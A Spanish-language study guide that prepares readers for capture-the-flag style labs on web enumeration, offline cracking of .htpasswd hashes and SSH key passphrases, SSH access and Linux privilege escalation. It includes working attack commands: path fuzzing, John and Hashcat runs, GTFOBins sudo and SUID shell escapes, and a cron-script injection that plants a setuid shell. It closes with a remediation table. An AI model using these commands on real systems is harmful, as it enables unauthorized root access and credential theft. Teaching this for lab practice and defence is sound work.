<div align="center">

# 📚 Teoría base — Enumeración web, crackeo offline y SSH/privesc

_Material de estudio para leer **antes** de resolver los labs._

</div>

---

## Índice

1. [Modelo mental: la cadena de ataque](#1-modelo-mental-la-cadena-de-ataque)
2. [Enumeración de un servidor web](#2-enumeración-de-un-servidor-web)
   - 2.1 [Cómo sirve archivos un servidor web](#21-cómo-sirve-archivos-un-servidor-web)
   - 2.2 [Códigos de estado HTTP que importan](#22-códigos-de-estado-http-que-importan)
   - 2.3 [Descubrimiento de contenido (fuzzing de rutas)](#23-descubrimiento-de-contenido-fuzzing-de-rutas)
   - 2.4 [Malas configuraciones clásicas](#24-malas-configuraciones-clásicas)
3. [Autenticación básica, `.htaccess` y `.htpasswd`](#3-autenticación-básica-htaccess-y-htpasswd)
   - 3.1 [Cómo funciona HTTP Basic Auth](#31-cómo-funciona-http-basic-auth)
   - 3.2 [`.htaccess`: qué es](#32-htaccess-qué-es)
   - 3.3 [`.htpasswd`: formatos de hash](#33-htpasswd-formatos-de-hash)
   - 3.4 [Por qué un `.htpasswd` filtrado es grave](#34-por-qué-un-htpasswd-filtrado-es-grave)
4. [Hashes y crackeo offline](#4-hashes-y-crackeo-offline)
   - 4.1 [Hash vs cifrado vs encoding](#41-hash-vs-cifrado-vs-encoding)
   - 4.2 [Identificar el formato de un hash](#42-identificar-el-formato-de-un-hash)
   - 4.3 [Diccionarios: rockyou y reglas](#43-diccionarios-rockyou-y-reglas)
   - 4.4 [John the Ripper](#44-john-the-ripper)
   - 4.5 [Hashcat](#45-hashcat)
   - 4.6 [Crackear una clave SSH privada](#46-crackear-una-clave-ssh-privada)
5. [SSH: acceso inicial y movimiento lateral](#5-ssh-acceso-inicial-y-movimiento-lateral)
   - 5.1 [Autenticación por clave pública](#51-autenticación-por-clave-pública)
   - 5.2 [Usar una clave obtenida](#52-usar-una-clave-obtenida)
   - 5.3 [Qué es "movimiento lateral"](#53-qué-es-movimiento-lateral)
6. [Escalada de privilegios en Linux](#6-escalada-de-privilegios-en-linux)
   - 6.1 [Enumeración local post-acceso](#61-enumeración-local-post-acceso)
   - 6.2 [`sudo` mal configurado y GTFOBins](#62-sudo-mal-configurado-y-gtfobins)
   - 6.3 [SUID](#63-suid)
   - 6.4 [Cron](#64-cron)
7. [Lado defensivo: cómo se arregla cada cosa](#7-lado-defensivo-cómo-se-arregla-cada-cosa)
8. [Checklist y chuleta de comandos](#8-checklist-y-chuleta-de-comandos)

---

## 1. Modelo mental: la cadena de ataque

Una intrusión real rara vez es "un exploit mágico". Es una **cadena**: muchos eslabones
pequeños, cada uno habilitado por el anterior. El patrón que vas a practicar es el más común
en entornos Linux mal administrados:

```
   Reconocimiento          Acceso inicial            Post-explotación
 ┌───────────────┐      ┌──────────────────┐      ┌────────────────────┐
 │ puertos/webs  │─────▶│ credencial válida │─────▶│  usuario normal    │
 │ archivos/conf │      │ (crackeo offline) │      │   ↓  escalada      │
 │ filtraciones  │      │  login por SSH    │      │       root         │
 └───────────────┘      └──────────────────┘      └────────────────────┘
       §2, §3                 §4, §5                      §6
```

Dos ideas que debés interiorizar:

- **La información filtrada es munición.** Un archivo de configuración olvidado, un
  comentario, un backup… no son "la bandera", son la **pista** que habilita el siguiente paso.
- **Offline > online.** Si conseguís un _hash_ (no la contraseña, sino su huella), lo atacás
  en **tu** máquina, sin tocar el objetivo, sin ruido, sin bloqueos por intentos fallidos.
  Eso es el "crackeo offline".

---

## 2. Enumeración de un servidor web

### 2.1 Cómo sirve archivos un servidor web

Un servidor como **Apache** o **nginx** tiene un _document root_ (típicamente
`/var/www/html`). Cuando pedís `http://sitio/algo.html`, el servidor busca
`/var/www/html/algo.html` y te lo devuelve. Consecuencias prácticas:

- **La estructura de URLs ≈ estructura de carpetas en disco.** Si existe `/var/www/html/backup/`,
  probablemente puedas pedir `http://sitio/backup/`.
- **Cualquier archivo dentro del _document root_ es potencialmente accesible**, aunque no haya
  un enlace que apunte a él. Si el admin deja `config.php.bak` ahí, está publicado aunque
  nadie "debería" conocerlo. De ahí que _enumerar_ = **adivinar nombres** de archivos y
  carpetas probables.

Apache además lee archivos de configuración:

| Archivo                       | Dónde                         | Para qué                             |
| :---------------------------- | :---------------------------- | :----------------------------------- |
| `apache2.conf` / `httpd.conf` | `/etc/apache2/`               | Config global                        |
| _VirtualHost_ (`*.conf`)      | `/etc/apache2/sites-enabled/` | Config por sitio                     |
| `.htaccess`                   | dentro del _webroot_          | Config **por directorio** (ver §3.2) |

### 2.2 Códigos de estado HTTP que importan

Cuando enumerás, el **código de estado** te dice qué encontraste sin necesidad de ver el
contenido:

|   Código    | Significado   | Qué te dice al enumerar                                                    |
| :---------: | :------------ | :------------------------------------------------------------------------- |
|    `200`    | OK            | El recurso existe y te lo dan.                                             |
| `301`/`302` | Redirección   | Suele indicar que una carpeta existe (redirige a la versión con `/`).      |
|    `401`    | Unauthorized  | **Existe pero pide autenticación** (¡Basic Auth! → §3).                    |
|    `403`    | Forbidden     | Existe pero prohíben verlo (p. ej. carpeta sin _index_ y sin _listing_).   |
|    `404`    | Not Found     | No existe.                                                                 |
|    `500`    | Error interno | Hay algo que falla en el servidor: a veces filtra rutas o errores jugosos. |

> Un `401` o `403` es **oro**: el servidor te está confirmando que ahí hay algo que vale la
> pena. Un `404` masivo es ruido.

Verlo con `curl`:

```bash
curl -I http://10.10.10.50/panel/        # -I = solo cabeceras (status + headers)
# HTTP/1.1 401 Unauthorized
# WWW-Authenticate: Basic realm="Zona restringida"
```

### 2.3 Descubrimiento de contenido (fuzzing de rutas)

Como los archivos no enlazados igual están publicados, se usan herramientas que **prueban
miles de nombres** de un diccionario y reportan los que existen.

**Herramientas** (equivalentes, elegí una):

- `gobuster` — rápido, simple.
- `feroxbuster` — recursivo por defecto (entra en las carpetas que encuentra).
- `ffuf` — el más flexible (fuzzea cualquier parte de la petición con `FUZZ`).

**Diccionarios** típicos (en Kali, dentro de `/usr/share/wordlists/`):

- `dirb/common.txt` — chico, rápido para un primer barrido.
- `dirbuster/directory-list-2.3-medium.txt` — el estándar, grande.
- `seclists/Discovery/Web-Content/...` — la colección más completa (`SecLists`).

**Extensiones:** no alcanza con carpetas. Pedí también variantes de archivo. Las más
rentables para encontrar filtraciones:

| Extensión                  | Qué suele ser                                           |
| :------------------------- | :------------------------------------------------------ |
| `.bak`, `.old`, `.orig`    | Respaldos manuales de archivos                          |
| `.txt`                     | Notas, listados, `robots.txt`                           |
| `.conf`, `.config`, `.ini` | Configuración                                           |
| `.zip`, `.tar.gz`          | Respaldos comprimidos del sitio entero                  |
| `~` (p. ej. `index.php~`)  | Backups que deja algún editor                           |
| `.swp`                     | Archivos temporales de `vim` (si editaron en el server) |

**Ejemplos:**

```bash
# gobuster: carpetas + probar extensiones de backup/config
gobuster dir -u http://10.10.10.50 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x bak,old,txt,conf,zip -t 40

# feroxbuster: recursivo, útil cuando aparecen carpetas anidadas
feroxbuster -u http://10.10.10.50 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -x bak,old,txt,conf

# ffuf: la palabra FUZZ marca dónde inyectar el diccionario
ffuf -u http://10.10.10.50/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -e .bak,.txt,.conf -mc 200,301,401,403
#  -mc = match codes: mostrar solo esos estados
```

### 2.4 Malas configuraciones clásicas

Lo que buscás al enumerar config web es alguno de estos patrones (todos pasan en producción):

1. **Directory listing / indexing activado.** Si una carpeta no tiene `index.html` y Apache
   tiene `Options +Indexes`, el servidor **lista todos los archivos** de esa carpeta como un
   explorador. Un atacante ve de una lo que hay (incluidos backups). Lo detectás porque
   `GET /carpeta/` devuelve una página con `Index of /carpeta`.

   ```bash
   curl -s http://10.10.10.50/backup/
   # <title>Index of /backup</title> ... <a href="config.php.bak">config.php.bak</a>
   ```

2. **Archivos de respaldo dentro del webroot.** `config.php.bak`, `db.conf.old`,
   `sitio.zip`… Contienen credenciales, rutas, estructura. Son la filtración número uno.

3. **Archivos de configuración servidos como texto.** Si un `.conf` o un `.bak` de un `.php`
   no lo procesa el intérprete, el servidor devuelve el **código fuente** en crudo
   (con sus contraseñas dentro).

4. **Archivos de control de versiones o metadatos expuestos.** `.git/`, `.svn/`, `.DS_Store`
   permiten reconstruir el código fuente o listar nombres de archivos.

---

## 3. Autenticación básica, `.htaccess` y `.htpasswd`

### 3.1 Cómo funciona HTTP Basic Auth

Es el mecanismo de login más simple del protocolo HTTP. Flujo:

1. Pedís un recurso protegido → el servidor responde **`401`** con la cabecera
   `WWW-Authenticate: Basic realm="..."`. El navegador muestra el típico _popup_ de
   usuario/contraseña.
2. Reenviás la petición con la cabecera:
   `Authorization: Basic <usuario:contraseña en base64>`.
3. Si coincide con lo definido en el servidor, te deja pasar.

> ⚠️ **`base64` NO es cifrado.** Es solo _encoding_ reversible. Sobre HTTP (sin TLS) las
> credenciales viajan prácticamente en claro.

```bash
# base64 es reversible: cualquiera lo decodifica
echo -n 'ana:Verano2024' | base64        # YW5hOlZlcmFubzIwMjQ=
echo 'YW5hOlZlcmFubzIwMjQ=' | base64 -d  # ana:Verano2024

# Enviar credenciales con curl (dos formas equivalentes):
curl -u ana:Verano2024 http://10.10.10.50/panel/
curl -H 'Authorization: Basic YW5hOlZlcmFubzIwMjQ=' http://10.10.10.50/panel/
```

### 3.2 `.htaccess`: qué es

Es un archivo de **configuración por directorio** de Apache. Se coloca dentro de una carpeta
del _webroot_ y aplica a esa carpeta y sus subcarpetas (si la config global lo permite con
`AllowOverride`). Uno de sus usos más comunes es proteger un directorio con Basic Auth:

```apache
# /var/www/html/panel/.htaccess
AuthType Basic
AuthName "Zona restringida"
AuthUserFile /etc/apache2/.htpasswd   # <- apunta al archivo de usuarios/hashes
Require valid-user
```

El `.htaccess` dice _"para entrar pedí usuario y contraseña, y comprobalos contra este
archivo `.htpasswd`"_. Por defecto Apache **bloquea** servir archivos que empiezan con `.ht`
(hay una regla global `<FilesMatch "^\.ht">` que los deniega). Pero esa protección es por el
**nombre**: una copia llamada `htpasswd.bak` o `passwords.txt` **no** está cubierta por esa
regla y se sirve sin problema. Ese es el error que se explota una y otra vez.

### 3.3 `.htpasswd`: formatos de hash

El archivo `.htpasswd` tiene una línea por usuario: `usuario:hash`. Nunca guarda la
contraseña en claro, guarda su **hash**. Formatos que vas a ver (el prefijo delata el algoritmo):

| Línea de ejemplo        | Algoritmo                | Fuerza    | Formato en John              |
| :---------------------- | :----------------------- | :-------- | :--------------------------- |
| `bob:$apr1$ab12$Xk....` | **APR1** (MD5 de Apache) | débil     | `md5crypt` / `md5crypt-long` |
| `bob:$2y$10$Nb....`     | **bcrypt**               | fuerte    | `bcrypt`                     |
| `bob:{SHA}kd93j....`    | SHA1 (base64)            | débil     | `Raw-SHA1` variantes         |
| `bob:aTqpl0Vch9gRk`     | crypt() DES tradicional  | muy débil | `descrypt`                   |

El de los ejemplos de este repo es **APR1** (`$apr1$`), que es MD5 salado: rápido de
calcular → rápido de crackear con diccionario. Se reconoce a simple vista por el prefijo.

### 3.4 Por qué un `.htpasswd` filtrado es grave

Si conseguís el archivo (porque estaba en una carpeta con _listing_, o había un `.bak`), tenés
`usuario:hash`. No es la contraseña… **todavía**. Pero el hash lo atacás **offline** (§4):
tu CPU prueba millones de palabras del diccionario contra ese hash hasta que una coincide.
Si la contraseña es de diccionario (lo habitual), la recuperás en segundos. Y una contraseña
de panel suele **reutilizarse** para SSH, DB, etc. → te habilita el siguiente eslabón.

---

## 4. Hashes y crackeo offline

### 4.1 Hash vs cifrado vs encoding

Conceptos que se confunden y hay que tener clarísimos:

|              |      Reversible      | Necesita clave | Ejemplo                       |
| :----------- | :------------------: | :------------: | :---------------------------- |
| **Encoding** |        ✅ sí         |     ❌ no      | `base64`, `hex`, URL-encoding |
| **Cifrado**  | ✅ sí (con la clave) |     ✅ sí      | AES, RSA                      |
| **Hash**     |  ❌ no (en teoría)   |     ❌ no      | MD5, SHA256, bcrypt, apr1     |

Un **hash** es una función de una sola dirección: de la contraseña sacás el hash, pero del
hash **no** podés "des-hashear" la contraseña. Entonces, ¿cómo se "crackea"? No se invierte:
se **adivina**. Tomás candidatos de un diccionario, los hasheás con el mismo algoritmo, y
comparás. Cuando el hash calculado == el hash objetivo, encontraste la contraseña.

El **salt** (esas letras tras `$apr1$ab12$`) es un valor aleatorio que se mezcla para que dos
usuarios con la misma contraseña tengan hashes distintos y no se puedan usar _rainbow tables_.
No frena un ataque de diccionario, solo lo hace por-hash.

### 4.2 Identificar el formato de un hash

Antes de crackear, **identificá el algoritmo** (si no, John/Hashcat no saben qué calcular).
Pistas por prefijo:

| Prefijo / forma          | Algoritmo                                          |
| :----------------------- | :------------------------------------------------- |
| `$apr1$`                 | MD5 de Apache (APR1)                               |
| `$1$`                    | MD5-crypt (Unix)                                   |
| `$5$`                    | SHA-256-crypt                                      |
| `$6$`                    | SHA-512-crypt (el típico de `/etc/shadow` moderno) |
| `$2a$` / `$2y$` / `$2b$` | bcrypt                                             |
| `$y$`                    | yescrypt (shadow muy moderno)                      |
| 32 hex                   | MD5 "pelado" (`d41d8cd9...`)                       |
| 40 hex                   | SHA1                                               |
| 64 hex                   | SHA256                                             |

Herramientas que lo adivinan por vos:

```bash
hashid '$apr1$ab12$Xk....'          # o: hash-identifier
nth --text '$apr1$ab12$Xk....'       # name-that-hash, el más moderno
```

### 4.3 Diccionarios: rockyou y reglas

**`rockyou.txt`** es el diccionario estándar: ~14 millones de contraseñas reales filtradas en 2009. En Kali suele venir comprimido:

```bash
ls -la /usr/share/wordlists/rockyou.txt.gz
sudo gunzip /usr/share/wordlists/rockyou.txt.gz   # descomprimir una vez
wc -l /usr/share/wordlists/rockyou.txt            # ~14.344.391 líneas
```

**Reglas (_rules_).** Si la contraseña es `Verano2024!` y el diccionario solo tiene `verano`,
una _regla_ la transforma al vuelo (mayúsculas, añadir números/símbolos, _leet_). En John:
`--rules`; en Hashcat: `-r reglas.rule` (p. ej. `best64.rule`).

### 4.4 John the Ripper

El crackeador clásico. Autodetecta muchos formatos.

```bash
# 1) ataque de diccionario (autodetecta formato)
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# 2) forzar un formato concreto (si la autodetección falla o es ambigua)
john --format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# 3) con reglas (muta el diccionario)
john --wordlist=/usr/share/wordlists/rockyou.txt --rules hash.txt

# 4) ver lo ya crackeado (John cachea en ~/.john/john.pot)
john --show hash.txt

# listar formatos soportados
john --list=formats | tr ',' '\n' | grep -i md5
```

> El archivo `hash.txt` contiene la(s) línea(s) a crackear. Para un `.htpasswd` es tal cual
> `usuario:$apr1$...`. Si John dice _"No password hashes loaded"_, casi siempre es formato mal
> indicado o el archivo tiene basura.

**Ejemplo completo (APR1), de principio a fin:**

```bash
$ cat hash.txt
bob:$apr1$ab12cd34$0fXk8s9Qe2hVZ3n1m4pLu0      # (hash inventado para el ejemplo)

$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt [MD5 256/256 AVX2 8x3])
verano2024       (bob)
1g 0:00:00:03 DONE ...

$ john --show hash.txt
bob:verano2024
```

### 4.5 Hashcat

El equivalente acelerado por GPU. Cambia la mecánica: el algoritmo se indica con un **número
de modo** (`-m`) y el tipo de ataque con `-a` (`0` = diccionario).

```bash
# APR1 es el modo 1600
hashcat -m 1600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# con reglas
hashcat -m 1600 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# ver resultado
hashcat -m 1600 hash.txt --show
```

Modos útiles: `0` MD5, `100` SHA1, `1400` SHA256, `1600` apr1/MD5-apache, `1800` SHA512-crypt
(`$6$`), `3200` bcrypt, `22921` clave RSA/SSH. (`hashcat --help | grep -i <algo>` los lista.)

### 4.6 Crackear una clave SSH privada

Una **clave SSH privada** (`id_rsa`) puede estar **cifrada con una passphrase**. Si la robás
pero está cifrada, al usarla te pide esa passphrase. Esa passphrase se crackea offline igual
que un hash.

Cómo reconocer una clave cifrada:

```bash
head -5 id_rsa
# Formato PEM antiguo (claramente cifrado):
# -----BEGIN RSA PRIVATE KEY-----
# Proc-Type: 4,ENCRYPTED           <- la palabra ENCRYPTED lo delata
# DEK-Info: AES-128-CBC,CD9B28...
#
# Formato OpenSSH nuevo:
# -----BEGIN OPENSSH PRIVATE KEY-----   (si pide passphrase al usarla, está cifrada)
```

Flujo con John (lo estándar):

```bash
# 1) convertir la clave a un "hash" que John entienda
ssh2john id_rsa > id_rsa.hash
#   (si no está en el PATH: python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash)

# 2) crackear la passphrase con rockyou
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

# 3) ver la passphrase
john --show id_rsa.hash
# id_rsa:montaña
```

> ⚠️ Si al usar la clave sale `UNPROTECTED PRIVATE KEY FILE` o
> `WARNING: bad permissions`, es porque el archivo es legible por otros. SSH exige permisos
> estrictos: `chmod 600 id_rsa`.

El equivalente en Hashcat es el modo `22921` (RSA/DSA/EC/OpenSSH), tras pasar también por
`ssh2john`.

---

## 5. SSH: acceso inicial y movimiento lateral

### 5.1 Autenticación por clave pública

SSH permite entrar sin contraseña usando un **par de claves**:

- **Clave privada** (`id_rsa`): la tenés vos. Secreta. Puede estar protegida por passphrase.
- **Clave pública** (`id_rsa.pub`): se copia en el servidor, en el archivo
  `~/.ssh/authorized_keys` del usuario destino.

Para entrar, SSH prueba que poseés la privada que corresponde a una pública autorizada. Por
eso, si conseguís **una clave privada** cuya pública está en `authorized_keys` de un usuario,
podés iniciar sesión como ese usuario (previo descifrado de la passphrase si la tiene).

Permisos que SSH exige (si no, los ignora o falla):

| Archivo                  | Permiso       | Octal |
| :----------------------- | :------------ | :---: |
| `~/.ssh/`                | solo el dueño | `700` |
| `~/.ssh/authorized_keys` | dueño rw      | `600` |
| clave privada `id_rsa`   | dueño rw      | `600` |

### 5.2 Usar una clave obtenida

```bash
chmod 600 id_rsa                       # imprescindible
ssh -i id_rsa usuario@10.10.10.50      # -i = identity file; pedirá la passphrase si tiene

# si el SSH está en un puerto no estándar (p. ej. 2222):
ssh -i id_rsa -p 2222 usuario@127.0.0.1
```

Opciones útiles cuando el host cambia o molesta la verificación (típico en labs):

```bash
ssh -i id_rsa -p 2222 \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  usuario@127.0.0.1
```

¿De dónde sale el **nombre de usuario**? De la enumeración: un comentario en la web, el campo
de la clave (`...== usuario@host`), un `.conf` filtrado, nombres en `/etc/passwd` si pudiste
leerlo, etc.

### 5.3 Qué es "movimiento lateral"

Es moverse **de un punto de apoyo a otro** dentro del sistema o la red, normalmente de un
usuario a otro, reutilizando lo que vas encontrando: una contraseña del panel web que sirve
para un usuario del sistema, una clave que te lleva de `www-data` a `juan`, credenciales de
`juan` que sirven para `maria`… Cada salto suele acercarte a datos o permisos mayores. En un
lab "fácil" el movimiento lateral es un único salto: **web → usuario del sistema por SSH**.

---

## 6. Escalada de privilegios en Linux

Ya tenés una shell como usuario normal. El objetivo ahora es **convertirte en `root`**. No se
adivina: se **enumera** el sistema buscando algo mal configurado que te dé más permisos.

### 6.1 Enumeración local post-acceso

Lo primero al caer en una shell:

```bash
id; whoami                 # quién sos, a qué grupos pertenecés
sudo -l                    # ¿qué podés correr como root? (el vector más común)
uname -a; cat /etc/os-release   # versión de kernel/SO (¿exploit conocido?)
cat /etc/passwd            # usuarios del sistema
find / -perm -4000 -type f 2>/dev/null   # binarios SUID (ver §6.3)
getcap -r / 2>/dev/null    # capabilities
cat /etc/crontab; ls -la /etc/cron.*     # tareas programadas (ver §6.4)
ls -la /home/*             # archivos de otros usuarios
```

Hay scripts que automatizan todo esto: **`linpeas.sh`** (el más popular),
`linux-smart-enumeration` (`lse.sh`), `pspy` (espía procesos/cron sin ser root).

### 6.2 `sudo` mal configurado y GTFOBins

`sudo` permite ejecutar comandos como otro usuario (por defecto `root`). El admin define en
`/etc/sudoers` **qué** puede correr **quién**. `sudo -l` te lo muestra:

```bash
$ sudo -l
User juan may run the following commands on host:
    (root) NOPASSWD: /usr/bin/find
```

`NOPASSWD` = ni siquiera pide contraseña. Acá está la trampa: **muchos binarios "inofensivos"
permiten salirse de su función y ejecutar comandos arbitrarios**. Si los corrés con `sudo`,
esos comandos corren **como root**. Esa base de datos de "cómo abusar de cada binario" es
**[GTFOBins](https://gtfobins.github.io)**.

Ejemplos de _escape a shell_ según el binario permitido (todos equivalen a "sos root"):

```bash
# find
sudo find . -exec /bin/sh \; -quit

# vim / vi
sudo vim -c ':!/bin/sh'

# less / more / man  (dentro del paginador)
sudo less /etc/profile
# luego escribí:  !/bin/sh

# awk
sudo awk 'BEGIN {system("/bin/sh")}'

# python
sudo python3 -c 'import os; os.system("/bin/sh")'

# tar  (via checkpoint)
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# env
sudo env /bin/sh
```

Si el binario solo permite **leer** archivos (no shell), igual te alcanza para leer la flag o
`/etc/shadow`:

```bash
sudo find /etc/passwd -exec cat /root/root.txt \; -quit   # leer un archivo de root
```

**Regla de oro:** apenas veas un binario en `sudo -l`, buscalo en GTFOBins. Si aparece bajo
"Sudo", tenés root.

### 6.3 SUID

Un binario con el bit **SUID** se ejecuta con los permisos de su **dueño**, no de quien lo
lanza. Si el dueño es `root`, cualquiera que lo ejecute corre ese código como root. Igual que
con sudo, muchos binarios SUID permiten escape a shell (GTFOBins tiene la sección "SUID").

```bash
# listar binarios SUID
find / -perm -4000 -type f 2>/dev/null
# -rwsr-xr-x  1 root root ...  /usr/bin/find     <- la 's' es el SUID

# abusar (ejemplo con find SUID):
find . -exec /bin/sh -p \; -quit       # -p conserva los privilegios
```

### 6.4 Cron

`cron` ejecuta tareas periódicas. Si una tarea la corre **root** y vos podés **modificar el
script** que ejecuta (o un archivo que ese script usa), le inyectás tu comando y correrá como
root en la próxima pasada.

```bash
cat /etc/crontab          # ver tareas y cada cuánto
ls -la /ruta/al/script.sh # ¿tenés permiso de escritura sobre lo que corre root?
# si podés escribir, agregás una reverse shell o: echo 'cp /bin/bash /tmp/b; chmod +s /tmp/b' >> script.sh
# (usá pspy para descubrir cron que no aparece en crontab)
```

---

## 7. Lado defensivo: cómo se arregla cada cosa

Entender la defensa consolida el ataque (y es lo que escribís en un informe):

| Vector                  | Remediación                                                                |
| :---------------------- | :------------------------------------------------------------------------- |
| Backups en el _webroot_ | Nunca dejar `*.bak`/`*.zip` servibles; sacarlos del _document root_.       |
| Directory listing       | `Options -Indexes` en Apache; por defecto apagado.                         |
| `.htpasswd` accesible   | Guardar `AuthUserFile` **fuera** del _webroot_; sin copias servibles.      |
| Hash débil (apr1/md5)   | Usar `bcrypt` (`htpasswd -B`); contraseñas largas y no de diccionario.     |
| Clave privada publicada | Jamás exponer claves en apps web; rotarlas si se filtran.                  |
| Passphrase débil        | Passphrase larga y aleatoria; mejor aún, no reutilizar claves.             |
| `sudo` demasiado amplio | Principio de mínimo privilegio; evitar binarios tipo GTFOBin con NOPASSWD. |
| SUID innecesario        | Quitar el bit SUID de binarios que no lo requieren.                        |
| Cron escribible         | Scripts de root propiedad de root y no escribibles por otros.              |

---

## 8. Checklist y chuleta de comandos

**Flujo mental:**

```
[1] nmap            ──▶ ¿qué puertos/servicios?
[2] gobuster/ffuf   ──▶ ¿qué rutas/archivos? (mirá 401/403/200+listing)
[3] curl            ──▶ leer configs/backups filtrados → credencial o hash
[4] hashid          ──▶ identificar formato del hash
[5] john/hashcat    ──▶ crackear offline con rockyou
[6] ssh -i          ──▶ acceso inicial → user.txt
[7] sudo -l / SUID  ──▶ vector de escalada (GTFOBins)
[8] root            ──▶ root.txt
```

**Chuleta:**

```bash
# --- Enumeración ---
nmap -sC -sV -p- <IP>
gobuster dir -u http://<IP> -w <wordlist> -x bak,old,txt,conf
curl -I http://<IP>/ruta/                      # ver status
curl -s http://<IP>/backup/                    # ver listing
curl -s -u user:pass http://<IP>/panel/        # con basic auth

# --- Identificar y crackear ---
hashid '<hash>'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
ssh2john id_rsa > id_rsa.hash && john --wordlist=.../rockyou.txt id_rsa.hash
hashcat -m <modo> -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# --- Acceso y escalada ---
chmod 600 id_rsa
ssh -i id_rsa -p <puerto> user@<IP>
id; sudo -l
find / -perm -4000 -type f 2>/dev/null
# -> buscar el binario en https://gtfobins.github.io
```

---

<div align="center">

_Cuando termines de leer, abrí el lab y la [`guia.md`](backstage/guia.md) de la máquina.
Intentá cada etapa vos primero; las pistas están colapsadas para abrirlas solo si te trabás._

</div>
